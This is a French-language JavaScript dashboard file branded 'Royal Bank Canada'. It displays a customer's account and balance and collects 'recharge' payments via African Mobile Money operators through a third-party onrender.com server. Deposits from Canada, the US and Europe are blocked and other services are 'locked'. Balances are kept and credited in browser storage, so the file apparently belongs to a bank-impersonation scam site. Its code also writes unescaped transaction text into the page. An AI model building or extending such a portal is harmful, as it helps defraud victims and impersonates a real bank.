//====================================================
// Royal Bank Canada
// dashboard.js
//====================================================

let currentUser = null;
let transactions = [];
let balanceVisible = true;
//====================================================
// PAYS ET OPERATEURS SEBPAY
//====================================================

const SEBPAY = {

CA:{
name:"Canada",
currency:"CAD",
prefix:"+1",
operators:[]
},

US:{
name:"États-Unis",
currency:"USD",
prefix:"+1",
operators:[]
},

FR:{
name:"France",
currency:"EUR",
prefix:"+33",
operators:[]
},

BE:{
name:"Belgique",
currency:"EUR",
prefix:"+32",
operators:[]
},

CH:{
name:"Suisse",
currency:"CHF",
prefix:"+41",
operators:[]
},

LU:{
name:"Luxembourg",
currency:"EUR",
prefix:"+352",
operators:[]
},

BJ:{
name:"Bénin",
currency:"XOF",
prefix:"+229",
operators:[
{name:"MTN Money",slug:"mtn"},
{name:"Moov Money",slug:"moov"}
]
},

CM:{
name:"Cameroun",
currency:"XAF",
prefix:"+237",
operators:[
{name:"MTN Money",slug:"mtn"}
]
},

CG:{
name:"Congo",
currency:"XAF",
prefix:"+242",
operators:[
{name:"Airtel Money",slug:"airtel"},
{name:"MTN Money",slug:"mtn"}
]
},

CI:{
name:"Côte d'Ivoire",
currency:"XOF",
prefix:"+225",
operators:[
{name:"MTN Money",slug:"mtn"},
{name:"Orange Money",slug:"orange"}
]
},

GM:{
name:"Gambie",
currency:"GMD",
prefix:"+220",
operators:[
{name:"Afri Money",slug:"afrimoney"}
]
},

GH:{
name:"Ghana",
currency:"GHS",
prefix:"+233",
operators:[
{name:"Airtel Money",slug:"airtel"},
{name:"MTN Money",slug:"mtn"},
{name:"Telecel Cash",slug:"telecel"}
]
},

GN:{
name:"Guinée",
currency:"GNF",
prefix:"+224",
operators:[
{name:"MTN Money",slug:"mtn"},
{name:"Orange Money",slug:"orange"}
]
},

GW:{
name:"Guinée-Bissau",
currency:"XOF",
prefix:"+245",
operators:[
{name:"Orange Money",slug:"orange"}
]
},

ML:{
name:"Mali",
currency:"XOF",
prefix:"+223",
operators:[
{name:"Moov Money",slug:"moov"},
{name:"Orange Money",slug:"orange"}
]
},

NE:{
name:"Niger",
currency:"XOF",
prefix:"+227",
operators:[
{name:"Airtel Money",slug:"airtel"},
{name:"Amanata",slug:"amanata"},
{name:"Moov Money",slug:"moov"},
{name:"Nita",slug:"nita"},
{name:"Wallet LigdiCash",slug:"wligdicash"},
{name:"Zamani",slug:"zamani"}
]
},

NG:{
name:"Nigéria",
currency:"NGN",
prefix:"+234",
operators:[
{name:"Airtel",slug:"airtel"},
{name:"MTN Money",slug:"mtn"}
]
},
    
GA:{
name:"Gabon",
currency:"XAF",
prefix:"+241",
operators:[
{name:"Airtel Money",slug:"airtel"}
]
},
    
CD:{
name:"RDC (CDF)",
currency:"CDF",
prefix:"+243",
operators:[
{name:"Airtel Money",slug:"airtel"},
{name:"Orange Money",slug:"orange"},
{name:"Vodacom",slug:"vodacom"}
]
},

CDUSD:{
name:"RDC (USD)",
currency:"USD",
prefix:"+243",
operators:[
{name:"Airtel Money",slug:"airtel"},
{name:"Orange Money",slug:"orange"},
{name:"Vodacom",slug:"vodacom"}
]
},
    
SN:{
name:"Sénégal",
currency:"XOF",
prefix:"+221",
operators:[
{name:"Free Money",slug:"free"},
{name:"Orange Money",slug:"orange"}
]
},

TD:{
name:"Tchad",
currency:"XAF",
prefix:"+235",
operators:[
{name:"Airtel",slug:"airtel"},
{name:"Moov",slug:"moov"}
]
},

TG:{
name:"Togo",
currency:"XOF",
prefix:"+228",
operators:[
{name:"Moov Money",slug:"moov"},
{name:"T-Money",slug:"tmoney"}
]
}
};
//====================================================
// INITIALISATION
//====================================================

document.addEventListener("DOMContentLoaded", () => {

    loadUser();

    loadTransactions();

    updateDashboard();

    updateSummary();

    initializeEvents();
    
    loadCountries();
    
});

//====================================================
// CHARGER LE CLIENT
//====================================================

function loadUser(){

    const data = localStorage.getItem("currentUser");

    if (!data) {

    localStorage.clear();
    sessionStorage.clear();

    window.location.replace("login.html");
    return;

}
    currentUser = JSON.parse(data);

}

//====================================================
// TABLEAU DE BORD
//====================================================

function updateDashboard(){

    const fullName =
        `${currentUser.firstName} ${currentUser.lastName}`;

    document.getElementById("welcomeTitle").textContent =
        "Bonjour " + currentUser.firstName;

    document.getElementById("welcomeName").textContent =
        "Bienvenue sur votre espace bancaire sécurisé.";

    document.getElementById("clientName").textContent =
        fullName;

    document.getElementById("cardHolder").textContent =
        fullName.toUpperCase();

    document.getElementById("clientAccount").textContent =
        currentUser.accountNumber;

    document.getElementById("accountNumber").textContent =
        currentUser.accountNumber;

    document.getElementById("clientId").textContent =
        currentUser.customerId;

    document.getElementById("clientInfoId").textContent =
        currentUser.customerId;

    document.getElementById("cardNumber").textContent =
        formatCard(currentUser.accountNumber);

    refreshBalance(currentUser.balance);
    
if (currentUser.profileImage) {

    document.getElementById("clientAvatar").src =
        "https://canada-1.onrender.com" +
        currentUser.profileImage;
    
}
}

//====================================================
// FORMAT CARTE
//====================================================

function formatCard(number){

    if(!number) return "**** **** **** ****";

    return number.replace(/(.{4})/g,"$1 ").trim();

}

//====================================================
// SOLDE
//====================================================

function refreshBalance(balance){

    currentUser.balance = Number(balance);

    if(balanceVisible){

        document.getElementById("balance").textContent =
            formatMoney(balance);

    }else{

        document.getElementById("balance").textContent =
            "********";

    }

}

//====================================================
// FORMAT ARGENT
//====================================================

function formatMoney(amount){

    return Number(amount).toLocaleString(

        "en-CA",

        {

            style:"currency",

            currency:"CAD"

        }

    );

}

//====================================================
// AFFICHER / MASQUER LE SOLDE
//====================================================

function toggleBalance(){

    balanceVisible = !balanceVisible;

    refreshBalance(currentUser.balance);

    const icon =
        document.querySelector("#toggleBalance i");

    if(balanceVisible){

        icon.className="fas fa-eye";

    }else{

        icon.className="fas fa-eye-slash";

    }

}

//====================================================
// EVENEMENTS
//====================================================

function initializeEvents(){

    document
    .getElementById("toggleBalance")
    .addEventListener("click",toggleBalance);

}
//====================================================
// TRANSACTIONS
//====================================================

function loadTransactions(){

    const data = localStorage.getItem("transactions");

    if(data){

        transactions = JSON.parse(data);

    }else{

        transactions = [];

    }

    displayTransactions();

}

//====================================================
// AFFICHAGE DES TRANSACTIONS
//====================================================

function displayTransactions(){

    const table =
        document.getElementById("transactionsTable");

    if(!table) return;

    table.innerHTML="";

    if(transactions.length===0){

        table.innerHTML=`

<tr>

<td colspan="5" style="text-align:center;padding:30px;">

Aucune transaction disponible.

</td>

</tr>

`;

        return;

    }

    transactions.forEach(transaction=>{

        const amountClass =
            transaction.amount>=0
            ? "credit"
            : "debit";

        const sign =
            transaction.amount>=0
            ? "+"
            : "-";

        table.innerHTML += `

<tr>

<td>${transaction.date}</td>

<td>${transaction.type}</td>

<td>${transaction.description}</td>

<td class="${amountClass}">

${sign} ${Math.abs(transaction.amount).toLocaleString("en-CA",{

minimumFractionDigits:2

})} $

</td>

<td>

<span class="status active">

${transaction.status}

</span>

</td>

</tr>

`;

    });

}

//====================================================
// AJOUTER TRANSACTION
//====================================================

function addTransaction(type,description,amount){

    const transaction={

        date:new Date().toLocaleDateString("fr-CA"),

        type:type,

        description:description,

        amount:Number(amount),

        status:"Complété"

    };

    transactions.unshift(transaction);

    localStorage.setItem(

        "transactions",

        JSON.stringify(transactions)

    );

    displayTransactions();

    updateSummary();

}

//====================================================
// RESUME FINANCIER
//====================================================

function updateSummary(){

    let income=0;

    let expense=0;

    transactions.forEach(item=>{

        if(item.amount>=0){

            income+=item.amount;

        }else{

            expense+=Math.abs(item.amount);

        }

    });

    document.getElementById("monthlyIncome").textContent=

        formatMoney(income);

    document.getElementById("monthlyExpense").textContent=

        formatMoney(expense);

    document.getElementById("savingAmount").textContent=

        formatMoney(income-expense);

}

//====================================================
// NOTIFICATIONS
//====================================================

function showNotification(message, icon = "fa-circle-check") {

    let toast = document.getElementById("toastNotification");

    if (!toast) {

        toast = document.createElement("div");
        toast.id = "toastNotification";

        toast.style.position = "fixed";
        toast.style.top = "20px";
        toast.style.right = "20px";
        toast.style.background = "#0057a3";
        toast.style.color = "#fff";
        toast.style.padding = "16px 20px";
        toast.style.borderRadius = "10px";
        toast.style.boxShadow = "0 8px 20px rgba(0,0,0,.25)";
        toast.style.zIndex = "999999";
        toast.style.fontSize = "15px";
        toast.style.display = "none";

        document.body.appendChild(toast);
    }

    toast.innerHTML = `
        <i class="fas ${icon}" style="margin-right:10px;"></i>
        ${message}
    `;

    toast.style.display = "block";

    setTimeout(() => {
        toast.style.display = "none";
    }, 4000);
}

//====================================================
// RECHARGER MON COMPTE
//====================================================

function openRecharge(){

resetRecharge();

document.getElementById("rechargeModal").style.display="flex";

}

function closeRecharge(){

    document.getElementById("rechargeModal").style.display = "none";

    document.getElementById("rechargeForm").reset();

    document.getElementById("mobileOperator").innerHTML =
    '<option value="">Choisissez d\'abord un pays</option>';

    document.getElementById("mobileOperator").disabled = true;

    document.getElementById("phoneNumber").disabled = true;

    document.getElementById("phoneNumber").placeholder = "Numéro Mobile Money";

    const submitButton = document.querySelector("#rechargeForm button[type='submit']");

    if (submitButton) {
        submitButton.disabled = false;
        submitButton.textContent = "Confirmer";
    }

}


//====================================================
// SERVICES VERROUILLÉS
//====================================================

function serviceLocked(){

    alert(

`Ce service n'est pas encore activé.

Veuillez contacter votre administrateur.`

    );

}

//====================================================
// FORMULAIRE RECHARGE
//====================================================

const rechargeForm=document.getElementById("rechargeForm");

if(rechargeForm){

rechargeForm.addEventListener("submit",submitRecharge);

}

async function submitRecharge(e){

    e.preventDefault();

    const country = document.getElementById("countrySelect").value;
    const amount = Number(document.getElementById("depositAmount").value);
    const operator = document.getElementById("mobileOperator").value;
    const phone = document.getElementById("phoneNumber").value.trim();

    if(country===""){
        alert("Veuillez choisir votre pays.");
        return;
    }

    if(operator===""){
        alert("Veuillez choisir votre opérateur.");
        return;
    }

    if(phone===""){
        alert("Veuillez saisir votre numéro Mobile Money.");
        return;
    }

    if(amount<=0){
        alert("Veuillez saisir un montant valide.");
        return;
    }

    const config = SEBPAY[country];

// Bloquer les doubles clics
const submitButton = rechargeForm.querySelector('button[type="submit"]');

if (submitButton.disabled) {
    return;
}

submitButton.disabled = true;
submitButton.textContent = "Traitement...";

try{

        console.log("currentUser =", currentUser);
        console.log("customerId =", currentUser.customerId);

        const response = await fetch(
            "https://canada-1.onrender.com/api/collections",
            {
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
                body: JSON.stringify({
                    usdAmount: amount,
                    amount: amount,
                    currency: config.currency,
                    phone: phone,
                    operator: operator,
                    country: country === "CDUSD" ? "CD" : country,
                    customerId: currentUser.customerId
                })
            }
        );

        const result = await response.json();
        
        console.log(result);

        if(response.ok){

           console.log("Réponse serveur :", result);

const transactionId =
    result.depositId ||
    result.data?.depositId ||
    result.transaction_id ||
    result.data?.transaction_id;

if (!transactionId) {
    console.log(result);
    alert("Impossible de récupérer l'identifiant de la transaction.");
    return;
}

          showPaymentStatus(
    "Paiement en cours...",
    "Veuillez confirmer le paiement sur votre téléphone Mobile Money.",
    "fas fa-spinner fa-spin",
    "#0057a3"
);

verifierPaiement(transactionId, amount);

        }else{

    submitButton.disabled = false;
    submitButton.textContent = "Confirmer";

    console.log(result);
    alert(result.message || result.error || "Paiement refusé.");

}

    }catch(err){

    submitButton.disabled = false;
    submitButton.textContent = "Confirmer";

    console.error(err);
    alert("Impossible de contacter le serveur.");

}

}

//====================================================
// RAFRAÎCHISSEMENT AUTOMATIQUE
//====================================================

function refreshDashboard(){

loadUser();

refreshBalance(currentUser.balance);

displayTransactions();

updateSummary();

}

setInterval(refreshDashboard,10000);

//====================================================
// SYNCHRONISATION
//====================================================

window.addEventListener("storage",function(){

loadUser();

displayTransactions();

refreshBalance(currentUser.balance);

updateSummary();

});

//====================================================
// SAUVEGARDE
//====================================================

function saveCurrentUser(){

localStorage.setItem(

"currentUser",

JSON.stringify(currentUser)

);

}

setInterval(saveCurrentUser,5000);

//====================================================
// DERNIÈRE CONNEXION
//====================================================

const now=new Date();

document.getElementById("lastConnection").textContent=

now.toLocaleString("fr-CA");

//====================================================
// DÉCONNEXION
//====================================================

function logout() {

    // Supprimer toutes les données de session
    localStorage.clear();
    sessionStorage.clear();

    // Empêcher le navigateur de conserver la page
    window.history.pushState(null, "", "login.html");

    // Redirection sans conserver la page dans l'historique
    window.location.replace("login.html");

}

//====================================================
// STATISTIQUES
//====================================================

function getStatistics(){

    if(!currentUser){
        return;
    }

    console.log({

        client: currentUser.firstName + " " + currentUser.lastName,

        compte: currentUser.accountNumber,

        solde: currentUser.balance,

        operations: transactions.length

    });

}
async function verifierPaiement(transactionId, amount) {

    const interval = setInterval(async () => {

        try {
            
            const response = await fetch(
                `https://canada-1.onrender.com/api/collections/${transactionId}`
            );

            const result = await response.json();

            const status = result.data?.status || result.status;

console.log("Statut :", status);

if (status === "COMPLETED") {

    clearInterval(interval);

    currentUser.balance += Number(amount);

    refreshBalance(currentUser.balance);

    saveCurrentUser();

    addTransaction(
        "Recharge",
        "Paiement Mobile Money",
        amount
    );

    showPaymentStatus(
        "Paiement confirmé",
        "Votre compte a été crédité avec succès.",
        "fas fa-circle-check",
        "#16a34a",
        true
    );

    closeRecharge();
}

if (status === "FAILED") {

    clearInterval(interval);

    showPaymentStatus(
        "Paiement refusé",
        "La transaction Mobile Money a été refusée.",
        "fas fa-circle-xmark",
        "#dc2626",
        true
    );

    closeRecharge();
}

        } catch (err) {

            console.error(err);

        }

    }, 5000);

}
getStatistics();

//====================================================
// FIN
//====================================================

//====================================================
// CHARGEMENT DES PAYS
//====================================================

function loadCountries(){

const country=document.getElementById("countrySelect");

if(!country) return;

country.innerHTML='<option value="">Sélectionnez votre pays</option>';

Object.keys(SEBPAY).forEach(code=>{

country.innerHTML+=`<option value="${code}">${SEBPAY[code].name}</option>`;

});

country.addEventListener("change",loadOperators);

}

//====================================================
// CHARGEMENT DES OPERATEURS
//====================================================

function loadOperators(){

const country=this.value;

const operator=document.getElementById("mobileOperator");

const phone=document.getElementById("phoneNumber");

operator.innerHTML="";

phone.value="";

phone.disabled=true;

if(country===""){

operator.disabled=true;

operator.innerHTML='<option value="">Choisissez d\'abord un pays</option>';

return;

}

    //====================================================
// VALIDATION DU NUMERO
//====================================================

    
if(SEBPAY[country].operators.length===0){

operator.disabled=true;

operator.innerHTML='<option value="">Aucun opérateur disponible</option>';

phone.disabled=true;

alert(
"Vous etre pas autorisé a recharger depuis ce pays.\n\nVeuillez contacter votre conseiller bancaire."
);

return;

}

operator.disabled=false;

operator.innerHTML='<option value="">Choisissez un opérateur</option>';

SEBPAY[country].operators.forEach(op=>{

operator.innerHTML+=`<option value="${op.slug}">${op.name}</option>`;

});

operator.addEventListener("change",function(){

if(this.value===""){

phone.disabled=true;

phone.placeholder="Numéro Mobile Money";

}else{

phone.disabled=false;

phone.placeholder=SEBPAY[country].prefix+"XXXXXXXX";

}

});

}
document.addEventListener("input",function(e){

if(e.target.id!=="phoneNumber") return;

const country=document.getElementById("countrySelect").value;

if(country==="") return;

const prefix=SEBPAY[country].prefix.replace("+","");

let value=e.target.value.replace(/\D/g,"");

if(value.startsWith(prefix)){

e.target.value=value;

}else{

e.target.value=prefix+value;

}

});
//====================================================
// RECHARGER LES LISTES
//====================================================

function resetRecharge(){

loadCountries();

document.getElementById("mobileOperator").disabled=true;

document.getElementById("phoneNumber").disabled=true;

}
/*==============================
GALERIE AGENCE
==============================*/

function changeAgencyImage(image){

    document.getElementById("mainAgencyImage").src = image;

}
/*======================================
GALERIE AGENCE
======================================*/


function showPaymentStatus(title, message, icon, color, showButton = false) {

    const modal = document.getElementById("paymentStatusModal");

    document.getElementById("paymentStatusTitle").innerText = title;
    document.getElementById("paymentStatusMessage").innerText = message;

    const statusIcon = document.getElementById("paymentStatusIcon");
    statusIcon.className = icon;
    statusIcon.style.color = color;

    const button = document.getElementById("paymentStatusButton");
    button.style.display = showButton ? "inline-block" : "none";
    button.onclick = closePaymentStatus;

    modal.style.display = "flex";
}

function closePaymentStatus() {
    document.getElementById("paymentStatusModal").style.display = "none";
}
//====================================================
// PHOTO DE PROFIL
//====================================================

const photoInput = document.getElementById("photoInput");
const changePhotoBtn = document.getElementById("changePhotoBtn");

if (photoInput && changePhotoBtn) {

    changePhotoBtn.addEventListener("click", () => {

        photoInput.click();

    });

    photoInput.addEventListener("change", async () => {

        if (!photoInput.files.length) return;

        const formData = new FormData();

        formData.append("photo", photoInput.files[0]);

        try {

            const response = await fetch(
                `https://canada-1.onrender.com/api/customers/${currentUser._id}/photo`,
                {
                    method: "POST",
                    body: formData
                }
            );

            const data = await response.json();

            if (data.success) {

                currentUser.profileImage = data.image;

                localStorage.setItem(
                    "currentUser",
                    JSON.stringify(currentUser)
                );

                document.getElementById("clientAvatar").src =
                    "https://canada-1.onrender.com" + data.image;

                alert("Photo de profil mise à jour.");

            } else {

                alert(data.message);

            }

        } catch (err) {

            console.error(err);

            alert("Erreur lors de l'envoi de la photo.");

        }

    });

}
